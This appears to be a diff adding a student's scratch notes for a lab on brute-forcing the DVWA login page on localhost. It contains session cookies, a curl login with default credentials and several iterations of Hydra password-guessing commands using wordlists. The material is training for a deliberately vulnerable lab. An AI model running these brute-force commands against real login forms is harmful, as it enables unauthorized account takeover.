@@ -1,0 +1,59 @@
+PHPSESSID=ebfc0bd5b94f15d9e38432f35061e9aa
+security=low
+
+
+curl -i -b "PHPSESSID=26ac4756888f30400309892e3860e7b3; security=low" -d "username=admin&password=password&Login=Login&user_token=a3523fd662eef6442fd8b4cfdfb1d9bd" -H "Referer: http://localhost:8806/login.php" "http://localhost:8806/login.php"  
+
+
+"http://localhost:8806/vulnerabilities/brute/?username=pablo&password=letmein&Login=Login#"
+
+
+
+
+
+hydra -L ~/Documents/temp/lab2cripto/informe/dics/usernames.txt -P ~/Documents/temp/lab2cripto/informe/dics/passwords.txt localhost -s 8806 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect:H=Cookie\: security=low; PHPSESSID=ebfc0bd5b94f15d9e38432f35061e9aa"
+
+
+
+
+hydra -L ~/Documents/temp/lab2cripto/informe/dics/usernames.txt \
+      -P ~/Documents/temp/lab2cripto/informe/dics/passwords.txt \
+      localhost -s 8806 http-get-form \
+      "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login&PHPSESSID=26ac4756888f30400309892e3860e7b3&security=low::S=Welcome" \
+      -o resultados_exitosos.txt -f -vV
+
+
+
+hydra -L ~/Documents/temp/lab2cripto/informe/dics/u.txt \
+      -P ~/Documents/temp/lab2cripto/informe/dics/p.txt \
+      localhost -s 8806 http-get-form \
+      "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login&PHPSESSID=26ac4756888f30400309892e3860e7b3&security=low::S=Welcome" \
+      -o resultados_exitosos.txt -f -vV
+
+
+
+
+hydra -L ~/Documents/temp/lab2cripto/informe/dics/u.txt \
+      -P ~/Documents/temp/lab2cripto/informe/dics/p.txt \
+      localhost -s 8806 http-get-form \
+      "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: security=low; PHPSESSID=e85e601283e3b30636487e6d4c5613e9" \
+      -o resultados_exitosos.txt -f -vV
+
+
+    
+
+    hydra -L ~/Documents/temp/lab2cripto/informe/dics/u.txt \
+      -P ~/Documents/temp/lab2cripto/informe/dics/p.txt \
+      localhost -s 8806 http-get-form \
+      "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: security=low; PHPSESSID=e85e601283e3b30636487e6d4c5613e9:S=Welcome" \
+      -o ~/Documents/temp/lab2cripto/informe/hydra/resultados_exitosos.txt -vV
+
+
+
+
+
+hydra -L ~/Documents/temp/lab2cripto/informe/dics/usernames.txt \
+      -P ~/Documents/temp/lab2cripto/informe/dics/passwords.txt \
+      localhost -s 8806 http-get-form \
+      "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: security=low; PHPSESSID=e85e601283e3b30636487e6d4c5613e9:S=Welcome" \
+      -o ~/Documents/temp/lab2cripto/informe/hydra/resultados_exitosos.txt -vV
